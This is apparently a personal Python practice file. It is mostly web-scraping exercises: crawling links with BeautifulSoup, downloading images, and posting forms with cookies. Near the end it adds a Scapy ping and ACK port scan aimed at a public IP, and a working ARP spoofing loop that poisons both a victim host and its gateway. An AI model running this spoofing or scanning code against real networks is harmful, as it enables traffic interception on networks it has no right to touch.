# -*- coding:utf-8 -*-
from urllib.request import urlopen
from urllib.request import ProxyHandler
from urllib.parse import urlparse
from urllib.request import urlretrieve
from urllib import request
from scapy.all import *
import os
import time
from PIL import Image, ImageFilter  # 图像处理
from bs4 import BeautifulSoup
import re
import random
import requests
import selenium
import datetime


def useProxy():
	proxy = {"http": "127.0.0.1:9910"}
	proxy_handler = ProxyHandler(proxies=proxy)
	opener = request.build_opener(proxy_handler)
	request.install_opener(opener)


def getBsObj(url):
	try:
		html = urlopen(url)
		bsObj = BeautifulSoup(html.read(), features="html.parser")
	except:
		print("url exception")
		return None
	return bsObj


def getProductAllPrice(obj):
	product = {}
	for sib in obj.find("table", {"id": "giftList"}).tr.next_siblings:
		if sib != "\n":
			attr = sib["id"]
			res = re.match(re.compile("^gift.*"), attr)
			if res != None:
				print(res.group(0), "===")
			productLst = list(sib.children)
			product[productLst[0].get_text().strip()] = productLst[2].get_text().strip()
	return product


def testStaticHtml():
	url = "http://www.pythonscraping.com/pages/page3.html"
	# title = getTitle("http://www.pythonscraping.com/pages/page1.html")
	obj = getBsObj(url)
	if obj == None:
		print("obj is null")
	else:
		# print(obj)
		products = getProductAllPrice(obj)
		for key, value in products.items():
			print("name=", key, "     price=", value)

def getLinks(articleUrl):
	try:
		html = urlopen("http://en.wikipedia.org"+articleUrl)
		bsObj = BeautifulSoup(html)
		obj = bsObj.find("div", {"id": "bodyContent"}).findAll("a", href=re.compile("^(/wiki/)((?!:).)*$"))
	except:
		print(articleUrl, " can not access")
		return None
	return obj

def testWikiHtml():
	random.seed()
	links = getLinks("/wiki/Kevin_Bacon")
	while links != None and len(links) > 0:
		newArticle = links[random.randint(0, len(links) - 1)].attrs["href"]
		print(newArticle)
		links = getLinks(newArticle)


pages = set()
random.seed()

# 获取页面所有内链的列表
def getInternalLinks(bsObj, includeUrl):
	internalLinks = []
	# 找出所有以"/"开头的链接
	for link in bsObj.findAll("a", href=re.compile("^(/|" + includeUrl + ").*")):
		if link.attrs['href'] is not None:
			if link.attrs['href'] not in internalLinks:
				if link.attrs['href'].startswith("/") and len(link.attrs['href']) > 1:
					internalLinks.append(includeUrl + link.attrs['href'])
				else:
					internalLinks.append(link.attrs['href'])
	return internalLinks


# 获取页面所有外链的列表
def getExternalLinks(bsObj, excludeUrl):
	externalLinks = []
	retUrl = urlparse(excludeUrl).scheme + "://" + urlparse(excludeUrl).netloc
	#print(retUrl)
	# 找出所有以"https"或"www"开头且不包含当前URL的链接 "^(https|www)(?!(https://oreilly.com).)*$"
	for link in bsObj.findAll("a", href=re.compile("^(?!.*" + retUrl + ").*$")):
		if link.attrs['href'] is not None and re.match("^(https|www)", link.attrs['href']) is not None:
			if link.attrs['href'] not in externalLinks:
				externalLinks.append(link.attrs['href'])
	return externalLinks


def splitAddress(address):
	addressParts = address.replace("http://", "").split("/")
	return addressParts


def getRandomExternalLink(startingPage):
	try:
		html = urlopen(startingPage)
		bsObj = BeautifulSoup(html, features="html.parser")
		loc = urlparse(startingPage).netloc
		externalLinks = getExternalLinks(bsObj, loc)
	except:
		print(startingPage, " ,can not access")
		return None
	if len(externalLinks) == 0:
		domain = urlparse(startingPage).scheme + "://" + urlparse(startingPage).netloc
		internalLinks = getInternalLinks(bsObj, domain)
		if len(internalLinks) == 0:
			return None
		elif len(internalLinks) > 1:
			return getRandomExternalLink(internalLinks[random.randint(0, len(internalLinks) - 1)])
		else:
			return getRandomExternalLink(internalLinks[0])
	else:
		return externalLinks[random.randint(0, len(externalLinks) - 1)]


def followExternalOnly(startingSite):
	externalLink = getRandomExternalLink(startingSite)
	if externalLink is not None:
		followExternalOnly(externalLink)
		print("Random external link is: " + externalLink)


# 收集网站上发现的所有外链列表
allExtLinks = set()
allIntLinks = set()

def getAllExternalLinks(siteUrl):
	try:
		html = urlopen(siteUrl)
		bsObj = BeautifulSoup(html, features="html.parser")
	except:
		print(siteUrl, " can not access")
		return
	internalLinks = getInternalLinks(bsObj, siteUrl)
	externalLinks = getExternalLinks(bsObj, siteUrl)
	for link in externalLinks:
		if link not in allExtLinks:
			allExtLinks.add(link)
			print("采集的外链是=>", link)
	for link in internalLinks:
		if link not in allIntLinks:
			#print("采集的内链是<=", link)
			allIntLinks.add(link)
			getAllExternalLinks(link)

def scrapImg(url):
	try:
		html = urlopen(url)
		bsObj = BeautifulSoup(html, features="html.parser")
	except:
		print(url, " can not access")
		return
	imgsObj = bsObj.findAll("img", {"decoding": "async"})
	for img in imgsObj:
		loc = "download/"
		loc += img["src"].split('/')[-1]
		urlretrieve(img["src"], loc)
		print("download ", img["src"], " to local path: ", loc, ",success")


def testPost():
	#params = {'firstname': 'liqiang', 'lastname': 'hello'}
	#r = requests.post("https://pythonscraping.com/pages/files/processing.php", data=params)
	#print(r.text)

	#files = {'uploadFile': open('./download/123.jpg', 'rb')}
	#r = requests.post("https://pythonscraping.com/pages/files/processing2.php", files=files)
	#print(r.text)

	#使用cookie
	login = {'username': 'hello', 'password': 'password'}
	r = requests.post("https://pythonscraping.com/pages/cookies/welcome.php", data=login)
	print(r.cookies.get_dict())
	print(r.text)
	r = requests.get("https://pythonscraping.com/pages/cookies/profile.php", cookies=r.cookies)
	print(r.text)

def testPostUseSession():
	session = requests.Session()
	params = {'username': 'username', 'password': 'password'}
	s = session.post("https://pythonscraping.com/pages/cookies/welcome.php", params)
	print("Cookie is set to:")
	print(s.cookies.get_dict())
	print("-----------")
	print("Going to profile page...")
	s = session.get("http://pythonscraping.com/pages/cookies/profile.php")
	print(s.text)


def test_blackweb():
	while(1):
		try:
			print("now,we will access the web")
			html = urlopen("http://104.233.231.194:7086/Vip")
			print(html.read())
			print(datetime.datetime.now())
		except:
			print("can not open it")
		finally:
			print("sleep for 3000s...")
			#print(date.time)
			time.sleep(3000)


##send()工作在第三层，而sendp()工作在第二层。且只发不收
##发送和接收数据包的函数，分别是sr()，sr1()，srp()，其中，sr()和sr1()主要用于第三层，例如IP和ARP等，而srp()用于第二层。
def testScapy(ip):
	#data = IP(dst=ip)/ICMP()
	#data.show()
	##send(data) #发送ICMP数据包
	data = IP(dst=ip) / ICMP()
	ans,unans = sr(data)
	ans.summary() #发送ICMP，等待数据返回

	print("=======================================================")
	port = [21, 23, 135, 443, 445]
	data = IP(dst=ip) / TCP(dport=port, flags="A")
	ans, unans = sr(data)
	ans.summary()
	for s, r in ans:
		print("发送：" + s.summary())
		print("回复：" + r.summary())
	for s, r in ans:
		if s[TCP].dport == r[TCP].sport:
			print("未过滤端口：" + str(s[TCP].dport))
	print("=======================================================")

def testArpAttack(dstip):
	victimIP = dstip
	gatewayIP = "192.168.0.1"
	localIP = "192.168.0.105"

	victiMac = getmacbyip(victimIP)  #被欺骗IP，X3机器
	gatewayMac = getmacbyip(gatewayIP)  #网关ip
	localMac =  "84:7b:57:63:6b:c7" #getmacbyip(localIP)  #本机IP
	print("ip: ", localIP, ",mac:", localMac)
	print("ip: ", victimIP, ",mac:", victiMac)
	print("ip: ", gatewayIP, ",mac:", gatewayMac)


	attackTarget=Ether(dst=victiMac)/ARP(psrc=gatewayIP, hwsrc = localMac, pdst=victimIP, hwdst=victiMac, op=1) #欺骗目标机器 X3
	attackGateway=Ether(dst=gatewayMac)/ARP(psrc=victimIP, hwsrc=localMac, pdst=gatewayIP, hwdst=gatewayMac, op=1)
	"""
	sendp(attackTarget,inter=1,loop=1)#此段代码进入死循环，无法执行下一条语句
	sendp(attackGateway,inter=1,loop=1)
	"""
	#修改后
	i = 0
	while 1:
		print("num:", i)
		sendp(attackGateway)
		sendp(attackTarget)
		print("sleep 1s")
		time.sleep(1)
		i = i + 1


#bsObj = BeautifulSoup(html.read(), features="html.parser")
getAllExternalLinks("https://www.oreilly.com")
#scrapImg("http://www.pythonscraping.com")
#testPost()
#testPostUseSession()
#test_blackweb()
#testScapy("104.233.231.194")
#testScapy("192.168.0.124")
#testArpAttack("192.168.0.137")
